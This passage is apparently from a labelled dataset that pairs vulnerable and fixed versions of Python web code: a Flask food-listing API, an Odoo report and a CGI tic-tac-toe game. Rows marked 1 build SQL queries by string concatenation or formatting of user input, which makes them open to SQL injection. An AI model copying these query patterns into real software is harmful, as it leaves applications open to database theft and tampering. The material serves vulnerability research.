    sql = ""SELECT * FROM {}"".format(listing_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""||	""
        strout = strout + ""<br>""
    sql = ""SELECT * FROM {}"".format(listing_tags_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    strout += ""<br><br><br>--------------------------TagTable-------------------------<br>""
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""	""

        strout = strout + ""<br>""
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """"""
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """"""

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """"""
    Return the in progress order that corresponds with ClientId and ListingID
    """"""
    matched_rows = []

    order = conn.cursor()
    order.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                  "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId) + "" AND \""ListingID\"" = "" + str(listingId) +
                  "" AND t1.\""Status\"" = \'In progress\'"")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """"""
    given a clientId and listingId cancel the order in progress associated with them
    """"""
    order = conn.cursor()
    order.execute(
        ""UPDATE public.\""Order\"" SET \""Status\"" = 'Canceled' WHERE \""ClientID\"" = "" + str(clientId) +
        "" AND \""ListingID\"" = "" + str(listingId) + "" AND \""Status\"" = \'In progress\'"")
    conn.commit()

    order.close()


def order_to_json(rows):
    """"""
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """"""
    string = """"
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += "",""

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """"""
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """"""

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return ""["" + output + ""]""  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """"""
    Return a list of Order tuples belonging to the client with the given id.
    """"""
    matched_rows = []

    orders = conn.cursor()
    orders.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                   "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = ""\'Completed\'""


@app.route(""/api/markComplete/<int:clientID>/<int:listingID>"", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """""" A function that changes the status of the order with listing id listing_id to complete.
        Returns ""Success"" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """"""

    sql = \
        """"""
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """""".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception(""The status of listing id's order was not changed. ClientID or ListingID may be out of range."")
    return ""Success""


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """"""
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """"""
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """"""
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """"""
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """"""
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """"""
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host=""0.0.0.0"", port=80)
    # host=""0.0.0.0"", port=80
/n/n/n",1
174,174,8e9dfe3698a6a8c747d5a1f0e719eaae8fc8c855,"ao_crm_helpdesk_problem_track/reports/qc_problem_track_report.py/n/n# Copyright 2019 Eficent Business and IT Consulting Services S.L.
# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).

from psycopg2.extensions import AsIs

from odoo import tools
from odoo import api, fields, models


class QCProblemReport(models.Model):
    _name = ""qc.problem.report""
    _description = ""Problem Tracking Report""
    _auto = False
    _rec_name = 'date'
    _order = 'date desc'

    name = fields.Char('Name', readonly=True)
    date = fields.Datetime('Helpdesk Create Date', readonly=True)
    notes = fields.Text('Notes', readonly=True)
    problem_group_id = fields.Many2one('qc.problem.group', 'Problem Group',
                                       readonly=True)
    color = fields.Integer('Color Index', readonly=True)
    priority = fields.Selection([
        ('0', 'Normal'),
        ('1', 'Low'),
        ('2', 'High'),
        ('3', 'Very High'),
    ], 'Rating', readonly=True)
    stage_id = fields.Many2one('qc.stage', 'Stage', readonly=True)
    qc_team_id = fields.Many2one('qc.team', 'QC Team', readonly=True)
    company_id = fields.Many2one('res.company', 'Company', readonly=True)
    crm_helpdesk_count = fields.Integer('Helpdesk Tickets Count',
                                        readonly=True)

    def _select(self):
        select_str = """"""
             SELECT qcp.id as id,
                    qcp.name as name,
                    qcp.notes as notes,
                    qcp.problem_group_id as problem_group_id,
                    qcp.color as color,
                    qcp.priority as priority,
                    qcp.stage_id as stage_id,
                    qcp.qc_team_id as qc_team_id,
                    qcp.company_id as company_id,
                    count(hpr) as crm_helpdesk_count,
                    chd.date as date
        """"""
        return select_str

    def _from(self):
        from_str = """"""
        qc_problem qcp
            left join helpdesk_problem_rel hpr on hpr.qc_problem_id = qcp.id
            left join crm_helpdesk chd on chd.id = hpr.crm_helpdesk_id
        """"""
        return from_str

    def _group_by(self):
        group_by_str = """"""
            GROUP BY
            qcp.id,
            chd.date
        """"""
        return group_by_str

    @api.model_cr
    def init(self):
        tools.drop_view_if_exists(self.env.cr, self._table)
        self.env.cr.execute(
            """"""
            CREATE or REPLACE VIEW %s as (%s
            FROM ( %s )
            %s)"""""",
            (AsIs(self._table), AsIs(self._select()),
             AsIs(self._from()), AsIs(self._group_by())),
        )
/n/n/n",0
175,175,8e9dfe3698a6a8c747d5a1f0e719eaae8fc8c855,"/ao_crm_helpdesk_problem_track/reports/qc_problem_track_report.py/n/n# Copyright 2019 Eficent Business and IT Consulting Services S.L.
# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).

from odoo import tools
from odoo import api, fields, models


class QCProblemReport(models.Model):
    _name = ""qc.problem.report""
    _description = ""Problem Tracking Report""
    _auto = False
    _rec_name = 'date'
    _order = 'date desc'

    name = fields.Char('Name', readonly=True)
    date = fields.Datetime('Helpdesk Create Date', readonly=True)
    notes = fields.Text('Notes', readonly=True)
    problem_group_id = fields.Many2one('qc.problem.group', 'Problem Group',
                                       readonly=True)
    color = fields.Integer('Color Index', readonly=True)
    priority = fields.Selection([
        ('0', 'Normal'),
        ('1', 'Low'),
        ('2', 'High'),
        ('3', 'Very High'),
    ], 'Rating', readonly=True)
    stage_id = fields.Many2one('qc.stage', 'Stage', readonly=True)
    qc_team_id = fields.Many2one('qc.team', 'QC Team', readonly=True)
    company_id = fields.Many2one('res.company', 'Company', readonly=True)
    crm_helpdesk_count = fields.Integer('Helpdesk Tickets Count',
                                        readonly=True)

    def _select(self):
        select_str = """"""
             SELECT qcp.id as id,
                    qcp.name as name,
                    qcp.notes as notes,
                    qcp.problem_group_id as problem_group_id,
                    qcp.color as color,
                    qcp.priority as priority,
                    qcp.stage_id as stage_id,
                    qcp.qc_team_id as qc_team_id,
                    qcp.company_id as company_id,
                    count(hpr) as crm_helpdesk_count,
                    chd.date as date
        """"""
        return select_str

    def _from(self):
        from_str = """"""
        qc_problem qcp
            left join helpdesk_problem_rel hpr on hpr.qc_problem_id = qcp.id
            left join crm_helpdesk chd on chd.id = hpr.crm_helpdesk_id
        """"""
        return from_str

    def _group_by(self):
        group_by_str = """"""
            GROUP BY
            qcp.id,
            chd.date
        """"""
        return group_by_str

    @api.model_cr
    def init(self):
        tools.drop_view_if_exists(self.env.cr, self._table)
        self.env.cr.execute(""""""CREATE or REPLACE VIEW %s as (
            %s
            FROM ( %s )
            %s
            )"""""" % (self._table,
                    self._select(),
                    self._from(),
                    self._group_by()))
/n/n/n",1
72,72,ee20e755caaf20bfabd7cfedf2f4c4eb24b7cf15,"cgi/common.py/n/n# NOTE: I did *NOT* add a shebang here, intentionally, because
#       this is *NEVER* supposed to be a user-facing script!



class FormError(BaseException):
    def __init__(this, msg):
        this.msg = msg



def get_game_info(conn, game):
    # get the basic game properties
    cursor = conn.cursor()
    cursor.execute(""SELECT player1,player2,size,state FROM games WHERE id = %s;"", (game,))
    if cursor.rowcount != 1:
        raise FormError(""Invalid game ID"")

    row = cursor.fetchall()[0]
    players = [row[0],row[1]]
    size    =  row[2]
    state   =  row[3]

    if state is None:
         state = ""Active""

    cursor.close()

    return (players,size,state)



def build_board(conn, game,size):
    # we'll build the empty board, and then fill in with the move list that
    # we get from the DB.
    board = []
    for i in range(size):
        board.append([""""]*size)


    # search for all moves that have happenend during this game.
    cursor = conn.cursor()
    cursor.execute(""SELECT x,y,letter FROM moves WHERE gameID = %s;"", (game,))

    counts = {""X"":0, ""O"":0}
    for move in cursor.fetchall():
        (x,y,letter) = move

        x = int(x)
        y = int(y)
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert letter in ""XO""

        assert board[x][y] == """"
        board[x][y] = letter

        counts[letter] += 1

    cursor.close()

    assert counts[""X""] >= counts[""O""]
    assert counts[""X""] <= counts[""O""]+1

    if counts[""X""] == counts[""O""]:
        nextPlayer = 0
    else:
        nextPlayer = 1
    letter = ""XO""[nextPlayer]

    return (board,nextPlayer,letter)

/n/n/ncgi/create_game.py/n/n#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir=""/var/log/httpd/cgi_err/"")


import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    if ""player1"" not in form or ""player2"" not in form or ""size"" not in form:
        raise FormError(""Invalid parameters."")

    player1 = form[""player1""].value
    player2 = form[""player2""].value
    for c in player1+player2:
        if c not in ""_-"" and not c.isdigit() and not c.isalpha():
            raise FormError(""Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens"")
            return

    try:
        size = int(form[""size""].value)
    except:
        raise FormError(""Invalid parameters: 'size' is not an integer."")
        return

    if size < 2 or size > 9:
        raise FormError(""The 'size' must be in the range 2-9, inclusive."")


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)
    cursor = conn.cursor()

    # insert the new row
    cursor.execute(""""""INSERT INTO games(player1,player2,size) VALUES(%s,%s,%s);"""""", (player1,player2,size))

    gameID = cursor.lastrowid


    # MySQLdb has been building a transaction as we run.  Commit them now, and
    # also clean up the other resources we've allocated.
    conn.commit()
    cursor.close()
    conn.close()

    return gameID



# this is what actually runs, each time that we are called...

try:
    #print(""Content-type: text/html"")
    #print()

    # this will not print out *ANYTHING* !!!
    gameID = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print(""Status: 303 See other"")
    print(""""""Location: http://%s/cgi-bin/list.py?new_game=%s"""""" % (pnsdp.WEB_HOST,gameID))
    print()

except FormError as e:
    print(""""""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href=""list.py"">Return to game list</a>

</body>
</html>

"""""" % e.msg, end="""")

except:
    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error


/n/n/ncgi/move.py/n/n#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir=""/var/log/httpd/cgi_err/"")

import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import get_game_info,build_board,FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)


    if ""user"" not in form or ""game"" not in form:
        raise FormError(""Invalid parameters."")
    if ""pos"" not in form and ""resign"" not in form:
        raise FormError(""Invalid parameters."")

    game = int(form[""game""].value)


    (players,size,state) = get_game_info(conn, game)

    user = form[""user""].value
    if user not in players:
        raise FormError(""Invalid player ID - player is not part of this game"")


    if ""resign"" in form:
        resign = True
    else:
        resign = False
        pos = form[""pos""].value.split("","")
        assert len(pos) == 2
        x = int(pos[0])
        y = int(pos[1])


    (board,nextPlayer,letter) = build_board(conn, game,size)

    if user != players[nextPlayer]:
        raise FormError(""Internal error, incorrect player is attempting to move."")


    if resign:
        # this user is choosing to resign.  Update the game state to reflect that.
        other_player_name = players[1-nextPlayer]

        cursor = conn.cursor()
        cursor.execute(""""""UPDATE games SET state=%s WHERE id=%s;"""""", (other_player_name+"":resignation"",game))
        cursor.close()

    else:
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert board[x][y] == """"
        board[x][y] = ""XO""[nextPlayer]

        # we've done all of our sanity checks.  We now know enough to say that
        # it's safe to add a new move.
        cursor = conn.cursor()
        cursor.execute(""""""INSERT INTO moves(gameID,x,y,letter,time) VALUES(%s,%s,%s,%s,NOW());"""""", (game,x,y,letter))

        if cursor.rowcount != 1:
            raise FormError(""Could not make move, reason unknown."")

        cursor.close()

        result = analyze_board(board)
        if result != """":
            if result == ""win"":
                result = players[nextPlayer]+"":win""

            cursor = conn.cursor()
            cursor.execute(""""""UPDATE games SET state=%s WHERE id=%s;"""""", (result,game))
            cursor.close()

    # we've made changes, make sure to commit them!
    conn.commit()
    conn.close()


    # return the parms to the caller, so that they can build a good redirect
    return (user,game)



def analyze_board(board):
    size = len(board)

    for x in range(size):
        # scan through the column 'x' to see if they are all the same.
        if board[x][0] == """":
            continue
        all_same = True
        for y in range(1,size):
            if board[x][y] != board[x][0]:
                all_same = False
                break
        if all_same:
            return ""win""

    for y in range(size):
        # scan through the row 'y' to see if they are all the same.
        if board[0][y] == """":
            continue
        all_same = True
        for x in range(1,size):
            if board[x][y] != board[0][y]:
                all_same = False
                break
        if all_same:
            return ""win""

    # check the NW/SE diagonal
    if board[0][0] != """":
        all_same = True
        for i in range(1,size):
            if board[i][i] != board[0][0]:
                all_same = False
                break
        if all_same:
            return ""win""

    # check the NE/SW diagonal
    if board[size-1][0] != """":
        all_same = True
        for i in range(1,size):
            if board[size-1-i][i] != board[size-1][0]:
                all_same = False
                break
        if all_same:
            return ""win""

    # check for stalemate
    for x in range(size):
        for y in range(size):
            if board[x][y] == """":
                return """"
    return ""stalemate""



# this is what actually runs, each time that we are called...

try:
#    print(""Content-type: text/html"")
#    print()

    # this will not print out *ANYTHING* !!!
    (user,game) = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print(""Status: 303 See other"")
    print(""""""Location: http://%s/cgi-bin/game.py?user=%s&game=%s"""""" % (pnsdp.WEB_HOST, user,game))
    print()

except FormError as e:
    print(""""""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href=""list.py"">Return to game list</a>

</body>
</html>

"""""" % e.msg, end="""")

except:
    print(""""""Content-Type: text/html;charset=utf-8\n\n"""""")

    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error


/n/n/n",0
73,73,ee20e755caaf20bfabd7cfedf2f4c4eb24b7cf15,"/cgi/common.py/n/n# NOTE: I did *NOT* add a shebang here, intentionally, because
#       this is *NEVER* supposed to be a user-facing script!



class FormError(BaseException):
    def __init__(this, msg):
        this.msg = msg



def get_game_info(conn, game):
    # get the basic game properties
    cursor = conn.cursor()
    cursor.execute(""SELECT player1,player2,size,state FROM games WHERE id = %d;"", (game,))
    if cursor.rowcount != 1:
        raise FormError(""Invalid game ID"")

    row = cursor.fetchall()[0]
    players = [row[0],row[1]]
    size    =  row[2]
    state   =  row[3]

    if state is None:
         state = ""Active""

    cursor.close()

    return (players,size,state)



def build_board(conn, game,size):
    # we'll build the empty board, and then fill in with the move list that
    # we get from the DB.
    board = []
    for i in range(size):
        board.append([""""]*size)


    # search for all moves that have happenend during this game.
    cursor = conn.cursor()
    cursor.execute(""SELECT x,y,letter FROM moves WHERE gameID = %d;"", (game,))

    counts = {""X"":0, ""O"":0}
    for move in cursor.fetchall():
        (x,y,letter) = move

        x = int(x)
        y = int(y)
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert letter in ""XO""

        assert board[x][y] == """"
        board[x][y] = letter

        counts[letter] += 1

    cursor.close()

    assert counts[""X""] >= counts[""O""]
    assert counts[""X""] <= counts[""O""]+1

    if counts[""X""] == counts[""O""]:
        nextPlayer = 0
    else:
        nextPlayer = 1
    letter = ""XO""[nextPlayer]

    return (board,nextPlayer,letter)

/n/n/n/cgi/create_game.py/n/n#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir=""/var/log/httpd/cgi_err/"")


import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    if ""player1"" not in form or ""player2"" not in form or ""size"" not in form:
        raise FormError(""Invalid parameters."")

    player1 = form[""player1""].value
    player2 = form[""player2""].value
    for c in player1+player2:
        if c not in ""_-"" and not c.isdigit() and not c.isalpha():
            raise FormError(""Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens"")
            return

    try:
        size = int(form[""size""].value)
    except:
        raise FormError(""Invalid parameters: 'size' is not an integer."")
        return

    if size < 2 or size > 9:
        raise FormError(""The 'size' must be in the range 2-9, inclusive."")


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)
    cursor = conn.cursor()

    # insert the new row
    cursor.execute(""""""INSERT INTO games(player1,player2,size) VALUES(""%s"",""%s"",%d);"""""", (player1,player2,size))

    gameID = cursor.lastrowid


    # MySQLdb has been building a transaction as we run.  Commit them now, and
    # also clean up the other resources we've allocated.
    conn.commit()
    cursor.close()
    conn.close()

    return gameID



# this is what actually runs, each time that we are called...

try:
    #print(""Content-type: text/html"")
    #print()

    # this will not print out *ANYTHING* !!!
    gameID = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print(""Status: 303 See other"")
    print(""""""Location: http://%s/cgi-bin/list.py?new_game=%s"""""" % (pnsdp.WEB_HOST,gameID))
    print()

except FormError as e:
    print(""""""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href=""list.py"">Return to game list</a>

</body>
</html>

"""""" % e.msg, end="""")

except:
    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error


/n/n/n/cgi/move.py/n/n#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir=""/var/log/httpd/cgi_err/"")

import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import get_game_info,build_board,FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)


    if ""user"" not in form or ""game"" not in form:
        raise FormError(""Invalid parameters."")
    if ""pos"" not in form and ""resign"" not in form:
        raise FormError(""Invalid parameters."")

    game = int(form[""game""].value)


    (players,size,state) = get_game_info(conn, game)

    user = form[""user""].value
    if user not in players:
        raise FormError(""Invalid player ID - player is not part of this game"")


    if ""resign"" in form:
        resign = True
    else:
        resign = False
        pos = form[""pos""].value.split("","")
        assert len(pos) == 2
        x = int(pos[0])
        y = int(pos[1])


    (board,nextPlayer,letter) = build_board(conn, game,size)

    if user != players[nextPlayer]:
        raise FormError(""Internal error, incorrect player is attempting to move."")


    if resign:
        # this user is choosing to resign.  Update the game state to reflect that.
        other_player_name = players[1-nextPlayer]

        cursor = conn.cursor()
        cursor.execute(""""""UPDATE games SET state=""%s:resignation"" WHERE id=%d;"""""", (other_player_name,game))
        cursor.close()

    else:
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert board[x][y] == """"
        board[x][y] = ""XO""[nextPlayer]

        # we've done all of our sanity checks.  We now know enough to say that
        # it's safe to add a new move.
        cursor = conn.cursor()
        cursor.execute(""""""INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,""%s"",NOW());"""""", (game,x,y,letter))

        if cursor.rowcount != 1:
            raise FormError(""Could not make move, reason unknown."")

        cursor.close()

        result = analyze_board(board)
        if result != """":
            if result == ""win"":
                result = players[nextPlayer]+"":win""

            cursor = conn.cursor()
            cursor.execute(""""""UPDATE games SET state=""%s"" WHERE id=%d;"""""", (result,game))
            cursor.close()

    # we've made changes, make sure to commit them!
    conn.commit()
    conn.close()


    # return the parms to the caller, so that they can build a good redirect
    return (user,game)



def analyze_board(board):
    size = len(board)

    for x in range(size):
        # scan through the column 'x' to see if they are all the same.
        if board[x][0] == """":
            continue
        all_same = True
        for y in range(1,size):
            if board[x][y] != board[x][0]:
                all_same = False
                break
        if all_same:
            return ""win""

    for y in range(size):
        # scan through the row 'y' to see if they are all the same.
        if board[0][y] == """":
            continue
        all_same = True
        for x in range(1,size):
            if board[x][y] != board[0][y]:
                all_same = False
                break
        if all_same:
            return ""win""

    # check the NW/SE diagonal
    if board[0][0] != """":
        all_same = True
        for i in range(1,size):
            if board[i][i] != board[0][0]:
                all_same = False
                break
        if all_same:
            return ""win""

    # check the NE/SW diagonal
    if board[size-1][0] != """":
        all_same = True
        for i in range(1,size):
            if board[size-1-i][i] != board[size-1][0]:
                all_same = False
                break
        if all_same:
            return ""win""

    # check for stalemate
    for x in range(size):
        for y in range(size):
            if board[x][y] == """":
                return """"
    return ""stalemate""



# this is what actually runs, each time that we are called...

try:
#    print(""Content-type: text/html"")
#    print()

    # this will not print out *ANYTHING* !!!
    (user,game) = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print(""Status: 303 See other"")
    print(""""""Location: http://%s/cgi-bin/game.py?user=%s&game=%s"""""" % (pnsdp.WEB_HOST, user,game))
    print()

except FormError as e:
    print(""""""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href=""list.py"">Return to game list</a>

</body>
</html>

"""""" % e.msg, end="""")

except:
    print(""""""Content-Type: text/html;charset=utf-8\n\n"""""")

    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error


/n/n/n",1
14,14,a0a5fd945a8bf128d4b9fb6a3ebc6306f82fa4d0,"lore/__init__.py/n/n# -*- coding: utf-8 -*-
from __future__ import absolute_import

import logging
import os
import sys
import atexit

from lore import env, util, ansi
from lore.ansi import underline
from lore.util import timer

logger = logging.getLogger(__name__)

if not (sys.version_info.major == 3 and sys.version_info.minor >= 6):
    ModuleNotFoundError = ImportError


__author__ = 'Montana Low and Jeremy Stanley'
__copyright__ = 'Copyright © 2017, Instacart'
__credits__ = ['Montana Low', 'Jeremy Stanley', 'Emmanuel Turlay']
__license__ = 'MIT'
__version__ = '0.4.46'
__maintainer__ = 'Montana Low'
__email__ = 'montana@instacart.com'
__status__ = 'Development Status :: 3 - Alpha'


def banner():
    import socket
    import getpass
    
    return '%s in %s on %s' % (
        ansi.foreground(ansi.GREEN, env.project),
        ansi.foreground(env.color, env.name),
        ansi.foreground(ansi.CYAN,
                        getpass.getuser() + '@' + socket.gethostname())
    )


lore_no_env = False
if hasattr(sys, 'lore_no_env'):
    lore_no_env = sys.lore_no_env

if len(sys.argv) > 1 and sys.argv[0][-4:] == 'lore' and sys.argv[1] in ['install', 'init']:
    lore_no_env = True

if not lore_no_env:
    # everyone else gets validated and launched on import
    env.validate()
    env.launch()

if env.launched():
    print(banner())
    logger.info(banner())
    logger.debug('python environment: %s' % env.prefix)

    if not lore_no_env:
